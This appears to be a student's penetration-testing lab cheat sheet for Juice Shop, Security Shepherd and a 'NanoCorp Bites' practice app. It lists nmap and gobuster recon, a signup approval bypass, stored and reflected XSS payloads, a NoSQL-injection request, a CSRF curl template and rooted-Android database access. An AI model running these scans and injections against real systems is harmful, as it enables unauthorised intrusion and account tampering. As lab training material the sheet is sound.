@@ -1,0 +1,518 @@
+PTS LAB MASTER COMMAND SHEET
+Compiled from the commands and payloads used in your PTS lab practice.
+Targets observed in the lab:
+  Juice Shop            -> http://192.168.20.47:51271
+  Security Shepherd     -> http://192.168.20.113:42966
+  NanoCorp Bites        -> http://192.168.20.178:51061
+
+======================================================================
+0) IMPORTANT
+======================================================================
+
+Use only inside your authorized lab environment.
+
+Replace placeholders like:
+  <IP>
+  <PORT>
+  <TOKEN>
+  <COOKIE>
+  <USERNAME>
+  <EMAIL>
+  <PASSWORD>
+
+======================================================================
+1) SCENARIO LAUNCHER / LAB STARTUP
+======================================================================
+
+chmod +x scenariolauncher
+sudo ./scenariolauncher init
+sudo ./scenariolauncher start
+
+If your instructor asks for a cleanup before re-init, the command you referred to was:
+sudo ./scenariolauncher fullcleanup
+
+Then:
+sudo ./scenariolauncher init
+sudo ./scenariolauncher start
+
+Useful Docker checks:
+docker info
+docker ps
+docker images
+
+If Docker Desktop / WSL is stuck on Windows:
+wsl --shutdown
+
+Then reopen Docker Desktop and check:
+docker info
+
+======================================================================
+2) BASIC TOOL INSTALLATION
+======================================================================
+
+sudo apt update
+sudo apt install -y nmap curl wget git whatweb gobuster ffuf nikto sqlmap
+
+Gobuster + wordlists:
+sudo apt update
+sudo apt install gobuster -y
+sudo apt install wordlists -y
+sudo apt install dirb -y
+
+Common wordlist paths:
+ls /usr/share/wordlists
+ls /usr/share/dirb/wordlists
+
+Common files:
+  /usr/share/wordlists/dirb/common.txt
+  /usr/share/dirb/wordlists/common.txt
+
+======================================================================
+3) RECON / DISCOVERY COMMANDS
+======================================================================
+
+Create a work folder:
+mkdir -p ~/pts/scans
+cd ~/pts
+
+Host discovery:
+nmap -sn 192.168.20.0/24 -oN ~/pts/scans/host-discovery.txt
+
+Service/version scan across subnet:
+nmap -sV 192.168.20.0/24 -oN ~/pts/scans/service-scan.txt
+
+Full TCP scan for one host:
+nmap -p- -sV -T4 <IP> -oN ~/pts/scans/<IP>-full.txt
+
+Example target scans you performed after discovery:
+nmap -p- -sV -T4 192.168.20.47 -oN ~/pts/scans/juice-full.txt
+nmap -p- -sV -T4 192.168.20.113 -oN ~/pts/scans/shepherd-full.txt
+nmap -p- -sV -T4 192.168.20.178 -oN ~/pts/scans/nanocorp-full.txt
+
+Quick web fingerprinting:
+curl -I http://<IP>:<PORT>
+whatweb http://<IP>:<PORT>
+
+Examples:
+curl -I http://192.168.20.47:51271
+curl -I http://192.168.20.113:42966
+curl -I http://192.168.20.178:51061
+
+whatweb http://192.168.20.47:51271
+whatweb http://192.168.20.113:42966
+whatweb http://192.168.20.178:51061
+
+======================================================================
+4) GOBUSTER DIRECTORY ENUMERATION
+======================================================================
+
+NanoCorp Bites command used:
+gobuster dir -u http://192.168.20.178:51061 -w /usr/share/wordlists/dirb/common.txt
+
+Alternative path if the wordlist exists under dirb:
+gobuster dir -u http://192.168.20.178:51061 -w /usr/share/dirb/wordlists/common.txt
+
+Example findings you saw:
+  /admin        -> 302 redirect to /login
+  /console      -> 400
+  /restaurants
+  /signup
+  /profile
+  /orders
+  /cart
+  /login
+
+Generic version:
+gobuster dir -u http://<IP>:<PORT> -w /usr/share/wordlists/dirb/common.txt
+
+======================================================================
+5) USEFUL CURL / PAGE FETCH COMMANDS
+======================================================================
+
+Fetch a page:
+curl -s http://<IP>:<PORT>/
+
+View headers:
+curl -I http://<IP>:<PORT>/
+
+Follow redirects:
+curl -L http://<IP>:<PORT>/admin
+
+Fetch with session cookie:
+curl -s "http://<IP>:<PORT>/profile" -b "session=<COOKIE>"
+
+Save response to a file:
+curl -s "http://<IP>:<PORT>/" -o page.html
+
+======================================================================
+6) FOR LOOPS YOU USED / REUSABLE RECON LOOPS
+======================================================================
+
+A) Curl several NanoCorp paths and grep for hints/comments/keywords.
+This is the loop you used in the NanoCorp workflow; the grep keyword set below is the recovered practical version:
+
+for path in home restaurants cart orders profile admin; do
+  echo "===== /$path ====="
+  curl -s "http://192.168.20.178:51061/$path" -b "session=<COOKIE>" \
+  | grep -iE '<!--|V[0-9]|hint|admin|debug|role|flag|approval|xss|csrf'
+  echo
+done
+
+B) Check common web roots for multiple known targets:
+for url in \
+  "http://192.168.20.47:51271" \
+  "http://192.168.20.113:42966" \
+  "http://192.168.20.178:51061"
+do
+  echo "===== $url ====="
+  curl -I "$url"
+  echo
+done
+
+C) Quick web fingerprints:
+for url in \
+  "http://192.168.20.47:51271" \
+  "http://192.168.20.113:42966" \
+  "http://192.168.20.178:51061"
+do
+  echo "===== $url ====="
+  whatweb "$url"
+  echo
+done
+
+======================================================================
+7) NANOCORP BITES — REQUESTS / FINDINGS YOU USED
+======================================================================
+
+Target:
+http://192.168.20.178:51061
+
+----------------------------------------------------------------------
+7.1) Signup approval bypass
+----------------------------------------------------------------------
+
+Normal signup request structure:
+POST /signup
+Content-Type: application/x-www-form-urlencoded
+
+username=<USERNAME>&email=<EMAIL>&password=<PASSWORD>&confirm=<PASSWORD>
+
+Bypass variant you used:
+username=test&email=test@example.com&password=test123&confirm=test123&approved=true
+
+Curl version:
+curl -i -X POST "http://192.168.20.178:51061/signup" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  --data "username=test&email=test@example.com&password=test123&confirm=test123&approved=true"
+
+----------------------------------------------------------------------
+7.2) Cart add POST request
+----------------------------------------------------------------------
+
+Endpoint seen in the HTML form:
+POST /cart/add
+
+Example body shape:
+item_id=5&item_name=SomeItem
+
+Curl template:
+curl -i -X POST "http://192.168.20.178:51061/cart/add" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -b "session=<COOKIE>" \
+  --data "item_id=5&item_name=SomeItem"
+
+----------------------------------------------------------------------
+7.3) Profile update POST request
+----------------------------------------------------------------------
+
+Endpoint:
+POST /profile
+
+Body format:
+display_name=<VALUE>&bio=<VALUE>
+
+Stored XSS payload that executed in NanoCorp:
+<img src=x onerror=alert(1)>
+
+Curl template:
+curl -i -X POST "http://192.168.20.178:51061/profile" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -b "session=<COOKIE>" \
+  --data-urlencode 'display_name=<img src=x onerror=alert(1)>' \
+  --data-urlencode 'bio=test'
+
+----------------------------------------------------------------------
+7.4) Reflected XSS in restaurants search
+----------------------------------------------------------------------
+
+Payload:
+<img src=x onerror=alert(1)>
+
+Example browser-style URL form:
+http://192.168.20.178:51061/restaurants?search=<PAYLOAD>
+
+Safer curl preview of server output:
+curl -sG "http://192.168.20.178:51061/restaurants" \
+  --data-urlencode 'search=<img src=x onerror=alert(1)>'
+
+----------------------------------------------------------------------
+7.5) Orders page
+----------------------------------------------------------------------
+
+Open in browser:
+http://192.168.20.178:51061/orders
+
+Curl:
+curl -s "http://192.168.20.178:51061/orders" -b "session=<COOKIE>"
+
+======================================================================
+8) BROWSER CONSOLE STORAGE COMMANDS
+======================================================================
+
+Inspect local storage:
+localStorage
+Object.keys(localStorage)
+
+Read one key:
+localStorage.getItem("keyname")
+
+Dump all localStorage values:
+for (let i = 0; i < localStorage.length; i++) {
+  const key = localStorage.key(i);
+  console.log(key, localStorage.getItem(key));
+}
+
+Inspect session storage:
+sessionStorage
+Object.keys(sessionStorage)
+
+Dump all sessionStorage values:
+for (let i = 0; i < sessionStorage.length; i++) {
+  const key = sessionStorage.key(i);
+  console.log(key, sessionStorage.getItem(key));
+}
+
+======================================================================
+9) JUICE SHOP — FETCH REQUESTS YOU USED
+======================================================================
+
+Target:
+http://192.168.20.47:51271
+
+----------------------------------------------------------------------
+9.1) PUT request shape you pasted originally
+----------------------------------------------------------------------
+
+await fetch("http://192.168.20.47:51271/rest/products/1/reviews", {
+  credentials: "include",
+  headers: {
+    "Authorization": "Bearer <TOKEN>",
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    message: "good",
+    author: "1ms23cs083@dot.com"
+  }),
+  method: "PUT",
+  mode: "cors"
+});
+
+----------------------------------------------------------------------
+9.2) PATCH request for NoSQL manipulation that was suggested
+----------------------------------------------------------------------
+
+await fetch("http://192.168.20.47:51271/rest/products/reviews", {
+  credentials: "include",
+  headers: {
+    "Accept": "application/json, text/plain, */*",
+    "Authorization": "Bearer <TOKEN>",
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    id: { "$ne": -1 },
+    message: "NoSQL Injection!"
+  }),
+  method: "PATCH",
+  mode: "cors"
+});
+
+----------------------------------------------------------------------
+9.3) Generic GET / POST / PATCH / DELETE fetch templates
+----------------------------------------------------------------------
+
+GET:
+await fetch("http://<IP>:<PORT>/<PATH>", {
+  credentials: "include",
+  method: "GET"
+}).then(r => r.text()).then(console.log);
+
+POST JSON:
+await fetch("http://<IP>:<PORT>/<PATH>", {
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json",
+    "Authorization": "Bearer <TOKEN>"
+  },
+  method: "POST",
+  body: JSON.stringify({ key: "value" })
+}).then(r => r.text()).then(console.log);
+
+PATCH JSON:
+await fetch("http://<IP>:<PORT>/<PATH>", {
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json",
+    "Authorization": "Bearer <TOKEN>"
+  },
+  method: "PATCH",
+  body: JSON.stringify({ key: "new-value" })
+}).then(r => r.text()).then(console.log);
+
+DELETE:
+await fetch("http://<IP>:<PORT>/<PATH>", {
+  credentials: "include",
+  headers: {
+    "Authorization": "Bearer <TOKEN>"
+  },
+  method: "DELETE"
+}).then(r => r.text()).then(console.log);
+
+======================================================================
+10) JUICE SHOP — CSRF CURL COMMAND
+======================================================================
+
+You had an exact POST-to-/profile CSRF-style curl command beginning like this:
+
+curl -i -X POST "http://192.168.20.47:51271/profile" \
+  -H "Origin: http://htmledit.squarefree.com" \
+  -H "Referer: http://htmledit.squarefree.com/" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -H "Cookie: token=<TOKEN>" \
+  --data "<FORM_BODY_HERE>"
+
+The exact final form body from that earlier message was not recoverable from retained context, so keep this as the ready template and fill the field names from the intercepted request.
+
+Useful way to reproduce from the browser Network tab:
+1. Trigger the action in browser.
+2. DevTools -> Network -> Right click request -> Copy as cURL.
+3. Paste into terminal and simplify.
+
+======================================================================
+11) JUICE SHOP — ERROR HANDLING PATH YOU USED
+======================================================================
+
+You used malformed REST path examples like:
+http://<JUICE_SHOP_HOST>/rest/qwertz
+
+For your discovered target:
+curl -i "http://192.168.20.47:51271/rest/qwertz"
+
+======================================================================
+12) SECURITY SHEPHERD
+======================================================================
+
+Local practice startup from WSL:
+cd ~/pts/SecurityShepherd
+docker-compose up
+
+Local URL you used in practice:
+https://localhost:8444
+
+You also looked for user-related requests in DevTools Network, e.g.:
+whoami
+/rest/user/whoami
+
+======================================================================
+13) STATIC APK ANALYSIS COMMANDS USED FOR MOBILE QUESTION
+======================================================================
+
+Because Kali was inside a container, the VM route was not practical; static analysis was the usable path.
+
+Install tools:
+sudo apt update
+sudo apt install apktool jadx sqlite3 unzip p7zip-full -y
+
+Decode APK:
+apktool d InsecureData.apk -o InsecureData_decoded
+
+Search interesting strings:
+grep -Rni "admin\|password\|sqlite\|database\|result" InsecureData_decoded
+
+Unzip APK:
+unzip InsecureData.apk -d apk_unzip
+
+Find embedded DB-like files:
+find apk_unzip -type f
+find apk_unzip -iname "*.db" -o -iname "*.sqlite"
+
+Open SQLite DB:
+sqlite3 file.db
+
+Inside sqlite:
+.tables
+.schema
+SELECT * FROM users;
+
+ADB / rooted Android VM route that was discussed:
+adb shell pm list packages | grep insecure
+adb shell
+su
+cd /data/data/<package-name>/databases
+ls
+sqlite3 database.db
+
+Inside sqlite:
+.tables
+.schema
+SELECT * FROM users;
+
+======================================================================
+14) HOW TO HOST THIS ON VERCEL AS A CURLABLE TEXT FILE
+======================================================================
+
+Create a simple static folder:
+mkdir -p pts-cheatsheet/public
+cd pts-cheatsheet
+
+Create:
+public/pts-lab.txt
+
+Paste this entire command sheet into:
+public/pts-lab.txt
+
+Deploy with Vercel CLI:
+npm install -g vercel
+vercel --prod
+
+After deployment, access:
+https://<your-vercel-domain>/pts-lab.txt
+
+From Kali:
+curl -k "https://<your-vercel-domain>/pts-lab.txt"
+
+Recommended:
+curl -ks "https://<your-vercel-domain>/pts-lab.txt" | less
+
+======================================================================
+15) ULTRA-SHORT EXAM FLOW
+======================================================================
+
+1. Start lab
+2. nmap -sn subnet
+3. nmap -p- -sV -T4 each host
+4. identify apps + ports
+5. curl -I / whatweb
+6. gobuster dir
+7. open in browser and inspect forms/network
+8. use known clean findings:
+   - NanoCorp approval bypass
+   - NanoCorp reflected XSS
+   - NanoCorp stored XSS
+   - Juice Shop known REST/fetch exercises
+   - Security Shepherd lesson tasks
+9. capture screenshots + commands + responses
+10. draft report
+
+======================================================================
+END
+======================================================================
